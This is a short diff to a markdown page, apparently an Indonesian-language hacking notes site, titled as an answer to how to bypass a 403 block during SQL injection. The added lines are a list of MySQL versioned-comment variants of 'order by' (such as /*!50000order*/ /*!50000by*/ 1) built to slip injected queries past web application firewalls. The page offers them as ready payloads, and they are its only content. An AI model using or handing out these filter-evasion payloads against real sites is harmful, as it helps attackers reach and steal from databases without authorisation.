@@ -6,6 +6,9 @@ permalink: /wantToKnow/403BSQLI/
 
 Assalamualaikum, Cara bypass 403 saat SQL Injection ?
 
-# In Order By
-- default = order by 1
-- bypass 1 = `/*!order*/ /*by*/ 1`
+- `/*!order*/ /*!by*/ 1`
+- `/*!50000order*/ /*!50000by*/ 1`
+- `/*!51000order*/ /*!50000by*/ 1`
+- `/*!12345order*/ /*!12345by*/ 1`
+- `/*!50000order/**-**/*/ /*!50000by*/ 1`
+- `/*!50000order/**-**/*/ /*!50000by/**-**/*/ 1`
